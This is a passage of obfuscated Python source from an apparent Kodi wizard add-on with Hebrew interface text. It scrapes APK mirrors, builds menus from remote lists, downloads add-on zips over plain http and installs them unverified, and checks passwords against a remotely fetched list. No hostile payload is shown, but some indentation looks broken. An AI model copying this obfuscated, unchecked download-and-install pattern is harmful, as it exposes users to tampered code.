	if not O0O00000OO0O00O0O ==True :#line:2029
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2030
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2031
	else :#line:2032
		O0OO0OOO0OOO00OO0 ,O0OOO000O0000OOO0 =wiz .thirdParty (OO00OO0O0OO0O00OO )#line:2033
		addFile ("[B]%s[/B]"%OOO00O0OO0O0OO0OO ,'',themeit =THEME3 )#line:2034
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2035
		if O0OO0OOO0OOO00OO0 :#line:2036
			for OOO00O0OO0O0OO0OO ,OO00OO00OO0O0OO0O ,OO00OO0O0OO0O00OO ,O0O0OO0O00000O0O0 ,OOOO00O000O0OOO00 ,OOOO00O0OOO00O0OO ,O000OO0OO0OO00OO0 ,OO0O0OO0OOO0O00O0 in O0OOO000O0000OOO0 :#line:2037
				if not SHOWADULT =='true'and O000OO0OO0OO00OO0 .lower ()=='yes':continue #line:2038
				addFile ("[%s] %s v%s"%(O0O0OO0O00000O0O0 ,OOO00O0OO0O0OO0OO ,OO00OO00OO0O0OO0O ),'installthird',OOO00O0OO0O0OO0OO ,OO00OO0O0OO0O00OO ,icon =OOOO00O000O0OOO00 ,fanart =OOOO00O0OOO00O0OO ,description =OO0O0OO0OOO0O00O0 ,themeit =THEME2 )#line:2039
		else :#line:2040
			for OOO00O0OO0O0OO0OO ,OO00OO0O0OO0O00OO ,OOOO00O000O0OOO00 ,OOOO00O0OOO00O0OO ,OO0O0OO0OOO0O00O0 in O0OOO000O0000OOO0 :#line:2041
				addFile (OOO00O0OO0O0OO0OO ,'installthird',OOO00O0OO0O0OO0OO ,OO00OO0O0OO0O00OO ,icon =OOOO00O000O0OOO00 ,fanart =OOOO00O0OOO00O0OO ,description =OO0O0OO0OOO0O00O0 ,themeit =THEME2 )#line:2042
def editThirdParty (OO0O000O00OOO0OOO ):#line:2044
	OOOOOOO000O0OO00O =eval ('THIRD%sNAME'%OO0O000O00OOO0OOO )#line:2045
	O00OOOO00OO0000O0 =eval ('THIRD%sURL'%OO0O000O00OOO0OOO )#line:2046
	O0O0000O0000O0OO0 =wiz .getKeyboard (OOOOOOO000O0OO00O ,'Enter the Name of the Wizard')#line:2047
	OOO00OOOO0OO0O0OO =wiz .getKeyboard (O00OOOO00OO0000O0 ,'Enter the URL of the Wizard Text')#line:2048
	wiz .setS ('wizard%sname'%OO0O000O00OOO0OOO ,O0O0000O0000O0OO0 )#line:2050
	wiz .setS ('wizard%surl'%OO0O000O00OOO0OOO ,OOO00OOOO0OO0O0OO )#line:2051
def apkScraper (name =""):#line:2053
	if name =='kodi':#line:2054
		OO000OOOOOO000O00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2055
		OOOOOO00O000O00O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2056
		O0O0OO00O00O0OO0O =wiz .openURL (OO000OOOOOO000O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2057
		O0O0OOOO000OOO00O =wiz .openURL (OOOOOO00O000O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2058
		O00O0OO0OOO000OOO =0 #line:2059
		OO00OOO0O0O0000OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0OO00O00O0OO0O )#line:2060
		O000O000000O00OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0OOOO000OOO00O )#line:2061
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2063
		OO0OOO00OOO0OO000 =False #line:2064
		for OOOOOO000000O0000 ,name ,O00OOOOO0O0OOO0O0 ,OO00OO0O0O0O00OO0 in OO00OOO0O0O0000OO :#line:2065
			if OOOOOO000000O0000 in ['../','old/']:continue #line:2066
			if not OOOOOO000000O0000 .endswith ('.apk'):continue #line:2067
			if not OOOOOO000000O0000 .find ('_')==-1 and OO0OOO00OOO0OO000 ==True :continue #line:2068
			try :#line:2069
				OOO000OO0OOOO00O0 =name .split ('-')#line:2070
				if not OOOOOO000000O0000 .find ('_')==-1 :#line:2071
					OO0OOO00OOO0OO000 =True #line:2072
					OOO0OO00OO0O000OO ,O00OOOOOOO000O0O0 =OOO000OO0OOOO00O0 [2 ].split ('_')#line:2073
				else :#line:2074
					OOO0OO00OO0O000OO =OOO000OO0OOOO00O0 [2 ]#line:2075
					O00OOOOOOO000O0O0 =''#line:2076
				O00O00O0O000O0OOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO0OOOO00O0 [0 ].title (),OOO000OO0OOOO00O0 [1 ],O00OOOOOOO000O0O0 .upper (),OOO0OO00OO0O000OO ,COLOR2 ,O00OOOOO0O0OOO0O0 .replace (' ',''),COLOR1 ,OO00OO0O0O0O00OO0 )#line:2077
				O00O000O000O0O000 =urljoin (OO000OOOOOO000O00 ,OOOOOO000000O0000 )#line:2078
				addFile (O00O00O0O000O0OOO ,'apkinstall',"%s v%s%s %s"%(OOO000OO0OOOO00O0 [0 ].title (),OOO000OO0OOOO00O0 [1 ],O00OOOOOOO000O0O0 .upper (),OOO0OO00OO0O000OO ),O00O000O000O0O000 )#line:2079
				O00O0OO0OOO000OOO +=1 #line:2080
			except :#line:2081
				wiz .log ("Error on: %s"%name )#line:2082
		for OOOOOO000000O0000 ,name ,O00OOOOO0O0OOO0O0 ,OO00OO0O0O0O00OO0 in O000O000000O00OOO :#line:2084
			if OOOOOO000000O0000 in ['../','old/']:continue #line:2085
			if not OOOOOO000000O0000 .endswith ('.apk'):continue #line:2086
			if not OOOOOO000000O0000 .find ('_')==-1 :continue #line:2087
			try :#line:2088
				OOO000OO0OOOO00O0 =name .split ('-')#line:2089
				O00O00O0O000O0OOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO0OOOO00O0 [0 ].title (),OOO000OO0OOOO00O0 [1 ],OOO000OO0OOOO00O0 [2 ],COLOR2 ,O00OOOOO0O0OOO0O0 .replace (' ',''),COLOR1 ,OO00OO0O0O0O00OO0 )#line:2090
				O00O000O000O0O000 =urljoin (OOOOOO00O000O00O0 ,OOOOOO000000O0000 )#line:2091
				addFile (O00O00O0O000O0OOO ,'apkinstall',"%s v%s %s"%(OOO000OO0OOOO00O0 [0 ].title (),OOO000OO0OOOO00O0 [1 ],OOO000OO0OOOO00O0 [2 ]),O00O000O000O0O000 )#line:2092
				O00O0OO0OOO000OOO +=1 #line:2093
			except :#line:2094
				wiz .log ("Error on: %s"%name )#line:2095
		if O00O0OO0OOO000OOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2096
	elif name =='spmc':#line:2097
		OO0OO000OO000O0OO ='https://github.com/koying/SPMC/releases'#line:2098
		O0O0OO00O00O0OO0O =wiz .openURL (OO0OO000OO000O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2099
		O00O0OO0OOO000OOO =0 #line:2100
		OO00OOO0O0O0000OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0O0OO00O00O0OO0O )#line:2101
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2103
		for name ,O00O000000OO0OO0O in OO00OOO0O0O0000OO :#line:2105
			O0O0O000OOO0O000O =''#line:2106
			O000O000000O00OOO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00O000000OO0OO0O )#line:2107
			for OOO0OO0O0OO0O0O0O ,O0OOOOOOOO0O0OOO0 ,OO0O000OOO0O00OOO in O000O000000O00OOO :#line:2108
				if OO0O000OOO0O00OOO .find ('armeabi')==-1 :continue #line:2109
				if OO0O000OOO0O00OOO .find ('launcher')>-1 :continue #line:2110
				O0O0O000OOO0O000O =urljoin ('https://github.com',OOO0OO0O0OO0O0O0O )#line:2111
				break #line:2112
		if O00O0OO0OOO000OOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2114
def apkMenu (url =None ):#line:2116
	if url ==None :#line:2117
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2120
	if not APKFILE =='http://':#line:2121
		if url ==None :#line:2122
			OO000O000OOOOO000 =wiz .workingURL (APKFILE )#line:2123
			OOOO0OOO0000OOO0O =uservar .APKFILE #line:2124
		else :#line:2125
			OO000O000OOOOO000 =wiz .workingURL (url )#line:2126
			OOOO0OOO0000OOO0O =url #line:2127
		if OO000O000OOOOO000 ==True :#line:2128
			OO00OO0O0OOO0OO0O =wiz .openURL (OOOO0OOO0000OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2129
			OOO00000OO00OO0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OO0O0OOO0OO0O )#line:2130
			if len (OOO00000OO00OO0O0 )>0 :#line:2131
				OOO0O00OO0O00O0O0 =0 #line:2132
				for OO0OO000O000O0000 ,OOO00OO00O00OO0O0 ,url ,OOOO0OO0OOOO000OO ,O00OO0O0OO00O000O ,O0OO0OOOO00OOO000 ,OO00OO00OO0O00O00 in OOO00000OO00OO0O0 :#line:2133
					if not SHOWADULT =='true'and O0OO0OOOO00OOO000 .lower ()=='yes':continue #line:2134
					if OOO00OO00O00OO0O0 .lower ()=='yes':#line:2135
						OOO0O00OO0O00O0O0 +=1 #line:2136
						addDir ("[B]%s[/B]"%OO0OO000O000O0000 ,'apk',url ,description =OO00OO00OO0O00O00 ,icon =OOOO0OO0OOOO000OO ,fanart =O00OO0O0OO00O000O ,themeit =THEME3 )#line:2137
					else :#line:2138
						OOO0O00OO0O00O0O0 +=1 #line:2139
						addFile (OO0OO000O000O0000 ,'apkinstall',OO0OO000O000O0000 ,url ,description =OO00OO00OO0O00O00 ,icon =OOOO0OO0OOOO000OO ,fanart =O00OO0O0OO00O000O ,themeit =THEME2 )#line:2140
					if OOO0O00OO0O00O0O0 <1 :#line:2141
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2142
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2143
		else :#line:2144
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2145
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2146
			addFile ('%s'%OO000O000OOOOO000 ,'',themeit =THEME3 )#line:2147
		return #line:2148
	else :wiz .log ("[APK Menu] No APK list added.")#line:2149
	setView ('files','viewType')#line:2150
def addonMenu (url =None ):#line:2152
	if not ADDONFILE =='http://':#line:2153
		if url ==None :#line:2154
			OO00000O0OO0OO00O =wiz .workingURL (ADDONFILE )#line:2155
			O00OOO0000O0OO0OO =uservar .ADDONFILE #line:2156
		else :#line:2157
			OO00000O0OO0OO00O =wiz .workingURL (url )#line:2158
			O00OOO0000O0OO0OO =url #line:2159
		if OO00000O0OO0OO00O ==True :#line:2160
			OO00OOOO000OO0000 =wiz .openURL (O00OOO0000O0OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2161
			O00OO0OO000OO0O00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OOOO000OO0000 )#line:2162
			if len (O00OO0OO000OO0O00 )>0 :#line:2163
				O00O00OO000OO0OOO =0 #line:2164
				for OOO0O0O0OO00OOO0O ,O000O0O00O000OOO0 ,url ,O0OO00000O00O00O0 ,OOOO00000OOO00O00 ,OOOOOO000O000OOO0 ,OOO0OOOO0O0O0O0OO ,O0O00O0000O0OOO0O ,O0OO000O0O0OO0O00 ,OOO0000OOOOOO0OO0 in O00OO0OO000OO0O00 :#line:2165
					if O000O0O00O000OOO0 .lower ()=='section':#line:2166
						O00O00OO000OO0OOO +=1 #line:2167
						addDir ("[B]%s[/B]"%OOO0O0O0OO00OOO0O ,'addons',url ,description =OOO0000OOOOOO0OO0 ,icon =OOO0OOOO0O0O0O0OO ,fanart =O0O00O0000O0OOO0O ,themeit =THEME3 )#line:2168
					else :#line:2169
						if not SHOWADULT =='true'and O0OO000O0O0OO0O00 .lower ()=='yes':continue #line:2170
						try :#line:2171
							O00O00O00OOOOOO0O =xbmcaddon .Addon (id =O000O0O00O000OOO0 ).getAddonInfo ('path')#line:2172
							if os .path .exists (O00O00O00OOOOOO0O ):#line:2173
								OOO0O0O0OO00OOO0O ="[COLOR green][Installed][/COLOR] %s"%OOO0O0O0OO00OOO0O #line:2174
						except :#line:2175
							pass #line:2176
						O00O00OO000OO0OOO +=1 #line:2177
						addFile (OOO0O0O0OO00OOO0O ,'addoninstall',O000O0O00O000OOO0 ,O00OOO0000O0OO0OO ,description =OOO0000OOOOOO0OO0 ,icon =OOO0OOOO0O0O0O0OO ,fanart =O0O00O0000O0OOO0O ,themeit =THEME2 )#line:2178
					if O00O00OO000OO0OOO <1 :#line:2179
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2180
			else :#line:2181
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2182
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2183
		else :#line:2184
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2185
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2186
			addFile ('%s'%OO00000O0OO0OO00O ,'',themeit =THEME3 )#line:2187
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2188
	setView ('files','viewType')#line:2189
def addonInstaller (OO00O00000OO0OO0O ,O00O0000OO0OO0OOO ):#line:2191
	if not ADDONFILE =='http://':#line:2192
		O000O000O00O0OOOO =wiz .workingURL (O00O0000OO0OO0OOO )#line:2193
		if O000O000O00O0OOOO ==True :#line:2194
			O00000OOOOOOOOO00 =wiz .openURL (O00O0000OO0OO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2195
			O0O0OOOO00O0O0O0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00O00000OO0OO0O ).findall (O00000OOOOOOOOO00 )#line:2196
			if len (O0O0OOOO00O0O0O0O )>0 :#line:2197
				for O0O000O0OO000O000 ,O00O0000OO0OO0OOO ,OOO00O0O0O0O0O00O ,OO0OO0O00O0OOOO00 ,O0000O0OOO00O0O0O ,OOO0O000OOO00O0OO ,OO00O000O0O0OO0OO ,O00OO00OO00OOOO0O ,O000O000OOOOO0OOO in O0O0OOOO00O0O0O0O :#line:2198
					if os .path .exists (os .path .join (ADDONS ,OO00O00000OO0OO0O )):#line:2199
						O0O00OOO0O0O000OO =['Launch Addon','Remove Addon']#line:2200
						O00OO0O0000OO0O00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0O00OOO0O0O000OO )#line:2201
						if O00OO0O0000OO0O00 ==0 :#line:2202
							wiz .ebi ('RunAddon(%s)'%OO00O00000OO0OO0O )#line:2203
							xbmc .sleep (1000 )#line:2204
							return True #line:2205
						elif O00OO0O0000OO0O00 ==1 :#line:2206
							wiz .cleanHouse (os .path .join (ADDONS ,OO00O00000OO0OO0O ))#line:2207
							try :wiz .removeFolder (os .path .join (ADDONS ,OO00O00000OO0OO0O ))#line:2208
							except :pass #line:2209
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO00O00000OO0OO0O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2210
								removeAddonData (OO00O00000OO0OO0O )#line:2211
							wiz .refresh ()#line:2212
							return True #line:2213
						else :#line:2214
							return False #line:2215
					O00O00OO0000O000O =os .path .join (ADDONS ,OOO00O0O0O0O0O00O )#line:2216
					if not OOO00O0O0O0O0O00O .lower ()=='none'and not os .path .exists (O00O00OO0000O000O ):#line:2217
						wiz .log ("Repository not installed, installing it")#line:2218
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO00O00000OO0OO0O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO00O0O0O0O0O00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2219
							OO00O0OOOOOOO000O =wiz .parseDOM (wiz .openURL (OO0OO0O00O0OOOO00 ),'addon',ret ='version',attrs ={'id':OOO00O0O0O0O0O00O })#line:2220
							if len (OO00O0OOOOOOO000O )>0 :#line:2221
								OO0000OOOOO00O0OO ='%s%s-%s.zip'%(O0000O0OOO00O0O0O ,OOO00O0O0O0O0O00O ,OO00O0OOOOOOO000O [0 ])#line:2222
								wiz .log (OO0000OOOOO00O0OO )#line:2223
								if KODIV >=17 :wiz .addonDatabase (OOO00O0O0O0O0O00O ,1 )#line:2224
								installAddon (OOO00O0O0O0O0O00O ,OO0000OOOOO00O0OO )#line:2225
								wiz .ebi ('UpdateAddonRepos()')#line:2226
								wiz .log ("Installing Addon from Kodi")#line:2228
								OOOO00O00OOOO0000 =installFromKodi (OO00O00000OO0OO0O )#line:2229
								wiz .log ("Install from Kodi: %s"%OOOO00O00OOOO0000 )#line:2230
								if OOOO00O00OOOO0000 :#line:2231
									wiz .refresh ()#line:2232
									return True #line:2233
							else :#line:2234
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOO00O0O0O0O0O00O )#line:2235
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO00O00000OO0OO0O ,OOO00O0O0O0O0O00O ))#line:2236
					elif OOO00O0O0O0O0O00O .lower ()=='none':#line:2237
						wiz .log ("No repository, installing addon")#line:2238
						O0000000OOOOO0000 =OO00O00000OO0OO0O #line:2239
						O00OOOO0OO000OO0O =O00O0000OO0OO0OOO #line:2240
						installAddon (OO00O00000OO0OO0O ,O00O0000OO0OO0OOO )#line:2241
						wiz .refresh ()#line:2242
						return True #line:2243
					else :#line:2244
						wiz .log ("Repository installed, installing addon")#line:2245
						OOOO00O00OOOO0000 =installFromKodi (OO00O00000OO0OO0O ,False )#line:2246
						if OOOO00O00OOOO0000 :#line:2247
							wiz .refresh ()#line:2248
							return True #line:2249
					if os .path .exists (os .path .join (ADDONS ,OO00O00000OO0OO0O )):return True #line:2250
					O0000O000OO0O0000 =wiz .parseDOM (wiz .openURL (OO0OO0O00O0OOOO00 ),'addon',ret ='version',attrs ={'id':OO00O00000OO0OO0O })#line:2251
					if len (O0000O000OO0O0000 )>0 :#line:2252
						O00O0000OO0OO0OOO ="%s%s-%s.zip"%(O00O0000OO0OO0OOO ,OO00O00000OO0OO0O ,O0000O000OO0O0000 [0 ])#line:2253
						wiz .log (str (O00O0000OO0OO0OOO ))#line:2254
						if KODIV >=17 :wiz .addonDatabase (OO00O00000OO0OO0O ,1 )#line:2255
						installAddon (OO00O00000OO0OO0O ,O00O0000OO0OO0OOO )#line:2256
						wiz .refresh ()#line:2257
					else :#line:2258
						wiz .log ("no match");return False #line:2259
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2260
		else :wiz .log ("[Addon Installer] Text File: %s"%O000O000O00O0OOOO )#line:2261
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2262
def installFromKodi (O0O00OO00OO0OO0OO ,over =True ):#line:2264
	if over ==True :#line:2265
		xbmc .sleep (2000 )#line:2266
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O00OO00OO0OO0OO )#line:2268
	if not wiz .whileWindow ('yesnodialog'):#line:2269
		return False #line:2270
	xbmc .sleep (1000 )#line:2271
	if wiz .whileWindow ('okdialog'):#line:2272
		return False #line:2273
	wiz .whileWindow ('progressdialog')#line:2274
	if os .path .exists (os .path .join (ADDONS ,O0O00OO00OO0OO0OO )):return True #line:2275
	else :return False #line:2276
def installAddon (OOO0O0O0000O00O0O ,OOO0OOOO0O00OO000 ):#line:2278
	if not wiz .workingURL (OOO0OOOO0O00OO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOO0O0O0000O00O0O ,COLOR2 ));return #line:2279
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2280
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0O0000O00O0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2281
	O0OOO0OOOO0000O00 =OOO0OOOO0O00OO000 .split ('/')#line:2282
	O0OO0OOO0OO0000O0 =os .path .join (PACKAGES ,O0OOO0OOOO0000O00 [-1 ])#line:2283
	try :os .remove (O0OO0OOO0OO0000O0 )#line:2284
	except :pass #line:2285
	downloader .download (OOO0OOOO0O00OO000 ,O0OO0OOO0OO0000O0 ,DP )#line:2286
	OO000OO0O0OOO00OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0O0000O00O0O )#line:2287
	DP .update (0 ,OO000OO0O0OOO00OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2288
	O0000OOO0O000O000 ,O00OO00OO00O0000O ,OOOO00OOO00OO00OO =extract .all (O0OO0OOO0OO0000O0 ,ADDONS ,DP ,title =OO000OO0O0OOO00OO )#line:2289
	DP .update (0 ,OO000OO0O0OOO00OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2290
	installed (OOO0O0O0000O00O0O )#line:2291
	installDep (OOO0O0O0000O00O0O ,DP )#line:2292
	DP .close ()#line:2293
	wiz .ebi ('UpdateAddonRepos()')#line:2294
	wiz .ebi ('UpdateLocalAddons()')#line:2295
	wiz .refresh ()#line:2296
def installDep (O00O000OOOOO0OO00 ,DP =None ):#line:2298
	OOO000O0OO000OOO0 =os .path .join (ADDONS ,O00O000OOOOO0OO00 ,'addon.xml')#line:2299
	if os .path .exists (OOO000O0OO000OOO0 ):#line:2300
		OOO0O0000000OOOOO =open (OOO000O0OO000OOO0 ,mode ='r');OOOOO0OO000OOOOOO =OOO0O0000000OOOOO .read ();OOO0O0000000OOOOO .close ();#line:2301
		OOO0000OO0OOOO000 =wiz .parseDOM (OOOOO0OO000OOOOOO ,'import',ret ='addon')#line:2302
		for OO0OO00O0O0OO0OOO in OOO0000OO0OOOO000 :#line:2303
			if not 'xbmc.python'in OO0OO00O0O0OO0OOO :#line:2304
				if not DP ==None :#line:2305
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO00O0O0OO0OOO ))#line:2306
				wiz .createTemp (OO0OO00O0O0OO0OOO )#line:2307
def installed (OO0O00O000OOOOO0O ):#line:2334
	O0OOOO00O0O00O0OO =os .path .join (ADDONS ,OO0O00O000OOOOO0O ,'addon.xml')#line:2335
	if os .path .exists (O0OOOO00O0O00O0OO ):#line:2336
		try :#line:2337
			OOOOO00000O000O00 =open (O0OOOO00O0O00O0OO ,mode ='r');OOO0OO0OO0O00O0OO =OOOOO00000O000O00 .read ();OOOOO00000O000O00 .close ()#line:2338
			OO0O000O0OOO00OO0 =wiz .parseDOM (OOO0OO0OO0O00O0OO ,'addon',ret ='name',attrs ={'id':OO0O00O000OOOOO0O })#line:2339
			OOOOOOOOO00OOO0OO =os .path .join (ADDONS ,OO0O00O000OOOOO0O ,'icon.png')#line:2340
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O000O0OOO00OO0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOOOOOOO00OOO0OO )#line:2341
		except :pass #line:2342
def youtubeMenu (url =None ):#line:2344
	if not YOUTUBEFILE =='http://':#line:2345
		if url ==None :#line:2346
			O000OOOO0O00OOOOO =wiz .workingURL (YOUTUBEFILE )#line:2347
			O0O0OO0OOOOOOO0O0 =uservar .YOUTUBEFILE #line:2348
		else :#line:2349
			O000OOOO0O00OOOOO =wiz .workingURL (url )#line:2350
			O0O0OO0OOOOOOO0O0 =url #line:2351
		if O000OOOO0O00OOOOO ==True :#line:2352
			O0OOOO00OO0OO0O0O =wiz .openURL (O0O0OO0OOOOOOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2353
			O00O0OO00O0OO0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OOOO00OO0OO0O0O )#line:2354
			if len (O00O0OO00O0OO0O0O )>0 :#line:2355
				for OO0O0O0O00OO0O0O0 ,O000OO0OOO0O0OOOO ,url ,OO000O0000O0O0O0O ,O00OOO0OOO00OO0O0 ,O00OOO0OOO00OO000 in O00O0OO00O0OO0O0O :#line:2356
					if O000OO0OOO0O0OOOO .lower ()=="yes":#line:2357
						addDir ("[B]%s[/B]"%OO0O0O0O00OO0O0O0 ,'youtube',url ,description =O00OOO0OOO00OO000 ,icon =OO000O0000O0O0O0O ,fanart =O00OOO0OOO00OO0O0 ,themeit =THEME3 )#line:2358
					else :#line:2359
						addFile (OO0O0O0O00OO0O0O0 ,'viewVideo',url =url ,description =O00OOO0OOO00OO000 ,icon =OO000O0000O0O0O0O ,fanart =O00OOO0OOO00OO0O0 ,themeit =THEME2 )#line:2360
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2361
		else :#line:2362
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2363
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2364
			addFile ('%s'%O000OOOO0O00OOOOO ,'',themeit =THEME3 )#line:2365
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2366
	setView ('files','viewType')#line:2367
def STARTP ():#line:2368
	OOO0O0O00O0O0OOOO =(ADDON .getSetting ("pass"))#line:2369
	if BUILDNAME =="":#line:2370
	 if not NOTIFY =='true':#line:2371
          OO0O00000OOO00O0O =wiz .workingURL (NOTIFICATION )#line:2372
	 if not NOTIFY2 =='true':#line:2373
          OO0O00000OOO00O0O =wiz .workingURL (NOTIFICATION2 )#line:2374
	 if not NOTIFY3 =='true':#line:2375
          OO0O00000OOO00O0O =wiz .workingURL (NOTIFICATION3 )#line:2376
	O0O000OO0O00O0O0O =OOO0O0O00O0O0OOOO #line:2377
	OO0O00000OOO00O0O =urllib2 .Request (SPEED )#line:2378
	O0OO0O00O0O0OOOO0 =urllib2 .urlopen (OO0O00000OOO00O0O )#line:2379
	OO0OOO0OO0000O0O0 =O0OO0O00O0O0OOOO0 .readlines ()#line:2381
	OO0O00OOO000O00O0 =0 #line:2385
	for OOOOOO000000OO0OO in OO0OOO0OO0000O0O0 :#line:2386
		if OOOOOO000000OO0OO .split (' ==')[0 ]==OOO0O0O00O0O0OOOO or OOOOOO000000OO0OO .split ()[0 ]==OOO0O0O00O0O0OOOO :#line:2387
			OO0O00OOO000O00O0 =1 #line:2388
			break #line:2389
	if OO0O00OOO000O00O0 ==0 :#line:2390
					OO0O0O0000O000000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2391
					if OO0O0O0000O000000 :#line:2393
						ADDON .openSettings ()#line:2395
						sys .exit ()#line:2397
					else :#line:2398
						sys .exit ()#line:2399
	return 'ok'#line:2403
def STARTP2 ():#line:2404
	OOO00OO0OOOOO00O0 =(ADDON .getSetting ("user"))#line:2405
	O0O0O000000000O00 =(UNAME )#line:2407
	OOO0OO00OO0OO0000 =urllib2 .urlopen (O0O0O000000000O00 )#line:2408
	O0O0O0O0O0O0O0O00 =OOO0OO00OO0OO0000 .readlines ()#line:2409
	OOO0OOOOO0OOO0O0O =0 #line:2410
	for OOOO0OO00OO00O0OO in O0O0O0O0O0O0O0O00 :#line:2413
		if OOOO0OO00OO00O0OO .split (' ==')[0 ]==OOO00OO0OOOOO00O0 or OOOO0OO00OO00O0OO .split ()[0 ]==OOO00OO0OOOOO00O0 :#line:2414
			OOO0OOOOO0OOO0O0O =1 #line:2415
			break #line:2416
	if OOO0OOOOO0OOO0O0O ==0 :#line:2417
